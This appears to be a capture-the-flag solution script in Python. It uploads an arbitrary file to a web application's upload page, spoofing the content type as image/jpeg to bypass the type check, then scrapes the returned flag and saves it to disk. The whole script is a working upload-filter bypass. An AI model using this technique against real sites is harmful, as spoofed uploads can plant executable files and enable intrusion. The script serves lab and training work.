import subprocess
from bs4 import BeautifulSoup
import sys
import requests


def get_flag(host_name, file):
    flag = None

    process = subprocess.Popen(
        ["curl", "-s", "-X", "POST",
         "-F", "uploaded=@{file};type=image/jpeg".format(file=file),
         "-F", "Upload=Upload",
         "http://{host}/index.php?page=upload".format(host=host_name)],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    with open('../flag', 'w') as f:
        try:
            flag = BeautifulSoup(stdout.decode('utf-8'), 'html.parser').find('h2').text.split(':')[-1].strip()
            f.write(flag+'\n')
        except Exception as e:
            print(e.args)

    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]
        file = sys.argv[2] if len(sys.argv) == 3 else 'petya.py'

        if check_host_name(host_name):
            print(get_flag(host_name, file))
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
